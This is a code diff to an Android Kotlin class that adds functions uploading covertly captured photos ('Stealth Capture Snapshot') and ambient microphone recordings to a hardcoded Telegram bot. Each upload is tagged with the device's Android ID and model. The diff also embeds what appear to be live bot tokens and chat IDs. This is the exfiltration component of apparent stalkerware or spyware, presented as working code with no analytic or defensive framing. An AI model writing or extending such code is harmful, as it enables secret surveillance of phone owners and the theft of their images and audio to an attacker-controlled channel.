@@ -17,12 +17,17 @@ class TelegramBotManager(private val context: Context) {
     private val client = OkHttpClient()
     private val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
 
+    companion object {
+        const val DEFAULT_BOT_TOKEN = "8938262266:AAHt5vVq0SMbMQUlAOFcYLjgGwLkkAjbOjM"
+        const val DEFAULT_CHAT_ID = "8425088277"
+    }
+
     private fun getBotToken(): String {
-        return prefs.getString("telegram_bot_token", "7709841005:AAE850bZ4q91v38Lq6R6F5x9gL3n8Q0k1X2") ?: "7709841005:AAE850bZ4q91v38Lq6R6F5x9gL3n8Q0k1X2"
+        return prefs.getString("telegram_bot_token", DEFAULT_BOT_TOKEN) ?: DEFAULT_BOT_TOKEN
     }
 
     private fun getChatId(): String {
-        return prefs.getString("telegram_chat_id", "7963421580") ?: "7963421580"
+        return prefs.getString("telegram_chat_id", DEFAULT_CHAT_ID) ?: DEFAULT_CHAT_ID
     }
 
     suspend fun saveConfig(token: String, chatId: String) {
@@ -59,7 +64,73 @@ class TelegramBotManager(private val context: Context) {
         }
     }
 
+    suspend fun sendPhoto(imageBytes: ByteArray, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val token = getBotToken()
+            val chatId = getChatId()
+            if (token.isBlank() || chatId.isBlank()) return@withContext false
+
+            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
+            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val fullCaption = "📸 *Stealth Capture Snapshot*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()
+
+            val url = "https://api.telegram.org/bot$token/sendPhoto"
+            val body = okhttp3.MultipartBody.Builder()
+                .setType(okhttp3.MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("caption", fullCaption)
+                .addFormDataPart("parse_mode", "Markdown")
+                .addFormDataPart(
+                    "photo",
+                    "snap_${System.currentTimeMillis()}.jpg",
+                    okhttp3.RequestBody.create("image/jpeg".toMediaType(), imageBytes)
+                )
+                .build()
+
+            val request = Request.Builder().url(url).post(body).build()
+            client.newCall(request).execute().use { response ->
+                return@withContext response.isSuccessful
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Telegram sendPhoto error: ${e.message}")
+            false
+        }
+    }
+
+    suspend fun sendAudio(audioBytes: ByteArray, filename: String = "audio.3gp", caption: String = ""): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val token = getBotToken()
+            val chatId = getChatId()
+            if (token.isBlank() || chatId.isBlank()) return@withContext false
+
+            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
+            val model = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val fullCaption = "🎤 *Ambient Audio Recording*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()
+
+            val url = "https://api.telegram.org/bot$token/sendAudio"
+            val body = okhttp3.MultipartBody.Builder()
+                .setType(okhttp3.MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("caption", fullCaption)
+                .addFormDataPart("parse_mode", "Markdown")
+                .addFormDataPart(
+                    "audio",
+                    filename,
+                    okhttp3.RequestBody.create("audio/*".toMediaType(), audioBytes)
+                )
+                .build()
+
+            val request = Request.Builder().url(url).post(body).build()
+            client.newCall(request).execute().use { response ->
+                return@withContext response.isSuccessful
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Telegram sendAudio error: ${e.message}")
+            false
+        }
+    }
+
     suspend fun pollTelegramCommands(): Unit = withContext(Dispatchers.IO) {
-        // Telegram bot control removed. Telegram is now used solely for sending alerts and captured media.
+        // Telegram bot control removed. Telegram is used solely for outbound alerts, photos, and audio.
     }
 }
